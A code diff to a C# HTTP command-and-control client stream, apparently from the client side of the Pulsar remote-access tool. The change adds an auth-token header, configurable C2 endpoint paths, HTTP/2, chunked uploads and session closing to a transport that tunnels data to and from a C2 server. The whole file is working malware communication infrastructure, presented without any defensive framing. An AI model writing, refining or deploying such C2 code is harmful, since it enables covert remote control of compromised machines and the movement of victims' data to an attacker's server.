@@ -1,10 +1,12 @@
 using System;
 using System.Buffers.Binary;
+using Pulsar.Common.Models;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.IO;
-using System.Net.Http;
 using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -13,6 +15,8 @@ namespace Pulsar.Client.Networking
     internal sealed class HttpC2ClientStream : Stream
     {
         private readonly Uri _baseUri;
+        private readonly HttpC2Paths _paths;
+        private readonly string _authToken;
         private readonly HttpClient _httpClient;
         private readonly ConcurrentQueue<byte> _incomingQueue = new ConcurrentQueue<byte>();
         private readonly AutoResetEvent _dataAvailable = new AutoResetEvent(false);
@@ -22,23 +26,30 @@ namespace Pulsar.Client.Networking
         private readonly object _frameBufferLock = new object();
 
         private const int FrameHeaderSize = 4;
+        private const int MaxFramePayload = 256 * 1024;
+        private const int DownstreamBufferSize = 8192;
 
         private string _sessionId;
         private bool _disposed;
 
-        public HttpC2ClientStream(Uri baseUri)
+        public HttpC2ClientStream(Uri baseUri, HttpC2Paths paths, string authToken)
         {
             _baseUri = baseUri ?? throw new ArgumentNullException(nameof(baseUri));
+            _paths = paths ?? new HttpC2Paths();
+            _authToken = (authToken ?? string.Empty).Trim();
 
-            var handler = new HttpClientHandler
+            var handler = new SocketsHttpHandler
             {
                 AllowAutoRedirect = true,
-                UseCookies = false
+                UseCookies = false,
+                MaxConnectionsPerServer = 1
             };
 
             _httpClient = new HttpClient(handler)
             {
-                BaseAddress = _baseUri
+                BaseAddress = _baseUri,
+                DefaultRequestVersion = HttpVersion.Version20,
+                DefaultVersionPolicy = HttpVersionPolicy.RequestVersionOrHigher
             };
 
             InitializeSession();
@@ -50,6 +61,20 @@ namespace Pulsar.Client.Networking
         public override bool CanWrite => !_disposed;
         public override long Length => throw new NotSupportedException();
         public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }
+
+        private void AddAuthHeader(HttpRequestMessage request)
+        {
+            if (request == null)
+            {
+                throw new ArgumentNullException(nameof(request));
+            }
+
+            if (!string.IsNullOrEmpty(_authToken))
+            {
+                request.Headers.Remove("X-Pulsar-Token");
+                request.Headers.TryAddWithoutValidation("X-Pulsar-Token", _authToken);
+            }
+        }
 
         public override void Flush()
         {
@@ -106,22 +131,29 @@ namespace Pulsar.Client.Networking
             ValidateBuffer(buffer, offset, count);
             EnsureNotDisposed();
 
-            // Wrap the application payload in the HTTP framing header so the server can deframe back to the TCP-style stream.
-            var framedPayload = new byte[FrameHeaderSize + count];
-            BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(framedPayload, 0, FrameHeaderSize), count);
-            Buffer.BlockCopy(buffer, offset, framedPayload, FrameHeaderSize, count);
+            while (count > 0)
+            {
+                var chunk = Math.Min(count, MaxFramePayload);
+                var framedPayload = new byte[FrameHeaderSize + chunk];
+                BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(framedPayload, 0, FrameHeaderSize), chunk);
+                Buffer.BlockCopy(buffer, offset, framedPayload, FrameHeaderSize, chunk);
 
 #if DEBUG
-            Debug.WriteLine($"[HTTP C2 CLIENT] Outgoing appLen={count}, framedLen={framedPayload.Length}, preview={PreviewHex(buffer, offset, count)}");
+                Debug.WriteLine($"[HTTP C2 CLIENT] Sending {chunk} bytes | Preview={PreviewHex(buffer, offset, chunk)}");
 #endif
 
-            using var content = new ByteArrayContent(framedPayload);
-            var response = _httpClient
-                .PostAsync($"c2/up?sid={_sessionId}", content, _cts.Token)
-                .GetAwaiter()
-                .GetResult();
+                using var request = new HttpRequestMessage(HttpMethod.Post, $"{_paths.Up}?sid={_sessionId}")
+                {
+                    Content = new ByteArrayContent(framedPayload)
+                };
 
-            response.EnsureSuccessStatusCode();
+                AddAuthHeader(request);
+                using var response = _httpClient.Send(request, HttpCompletionOption.ResponseHeadersRead, _cts.Token);
+                response.EnsureSuccessStatusCode();
+
+                offset += chunk;
+                count -= chunk;
+            }
         }
 
         public override IAsyncResult BeginWrite(byte[] buffer, int offset, int count, AsyncCallback callback, object state)
@@ -169,6 +201,7 @@ namespace Pulsar.Client.Networking
                 _disposed = true;
                 _cts.Cancel();
                 _dataAvailable.Set();
+                TryCloseSession();
                 _httpClient.Dispose();
                 _cts.Dispose();
                 _dataAvailable.Dispose();
@@ -177,43 +210,65 @@ namespace Pulsar.Client.Networking
             base.Dispose(disposing);
         }
 
-        private void InitializeSession()
+        private void TryCloseSession()
         {
-            var response = _httpClient.PostAsync("c2/open", new ByteArrayContent(Array.Empty<byte>()), _cts.Token)
-                .GetAwaiter()
-                .GetResult();
-
-            response.EnsureSuccessStatusCode();
-
-            var session = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
-            _sessionId = session?.Trim();
-
             if (string.IsNullOrWhiteSpace(_sessionId))
             {
-                throw new InvalidOperationException("Failed to obtain session id for HTTP C2 stream.");
+                return;
             }
+
+            try
+            {
+                using var request = new HttpRequestMessage(HttpMethod.Post, $"{_paths.Close}?sid={_sessionId}")
+                {
+                    Content = new ByteArrayContent(Array.Empty<byte>())
+                };
+                AddAuthHeader(request);
+                using var response = _httpClient.Send(request, HttpCompletionOption.ResponseHeadersRead, CancellationToken.None);
+            }
+            catch
+            {
+            }
+        }
+
+        private void InitializeSession()
+        {
+            using var request = new HttpRequestMessage(HttpMethod.Post, _paths.Open)
+            {
+                Content = new ByteArrayContent(Array.Empty<byte>())
+            };
+            AddAuthHeader(request);
+
+            using var response = _httpClient.Send(request, HttpCompletionOption.ResponseHeadersRead, _cts.Token);
+            response.EnsureSuccessStatusCode();
+
+            _sessionId = response.Content.ReadAsStringAsync().GetAwaiter().GetResult()?.Trim();
+            if (string.IsNullOrWhiteSpace(_sessionId))
+                throw new InvalidOperationException("HTTP C2: Failed to establish session.");
         }
 
         private async Task PollDownstreamAsync()
         {
+            var buffer = new byte[DownstreamBufferSize];
+
             while (!_cts.IsCancellationRequested)
             {
                 try
                 {
-                    using (var response = await _httpClient.PostAsync($"c2/down?sid={_sessionId}", new ByteArrayContent(Array.Empty<byte>()), HttpCompletionOption.ResponseHeadersRead, _cts.Token))
+                    using var request = new HttpRequestMessage(HttpMethod.Post, $"{_paths.Down}?sid={_sessionId}")
                     {
-                        response.EnsureSuccessStatusCode();
-                        using (var stream = await response.Content.ReadAsStreamAsync(_cts.Token))
-                        {
-                            var buffer = new byte[8192];
-                            int read;
-                            while ((read = await stream.ReadAsync(buffer, 0, buffer.Length, _cts.Token)) > 0)
-                            {
-                                // Only feed framed bytes into the HTTP frame processor; it deframes, enqueues payload bytes,
-                                // and signals availability for readers.
-                                ProcessIncomingFrames(buffer, read);
-                            }
-                        }
+                        Content = new ByteArrayContent(Array.Empty<byte>())
+                    };
+                    AddAuthHeader(request);
+
+                    using var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, _cts.Token).ConfigureAwait(false);
+                    response.EnsureSuccessStatusCode();
+
+                    using var stream = await response.Content.ReadAsStreamAsync(_cts.Token).ConfigureAwait(false);
+                    int read;
+                    while ((read = await stream.ReadAsync(buffer, 0, buffer.Length, _cts.Token).ConfigureAwait(false)) > 0)
+                    {
+                        ProcessIncomingFrames(buffer, read);
                     }
                 }
                 catch (OperationCanceledException)
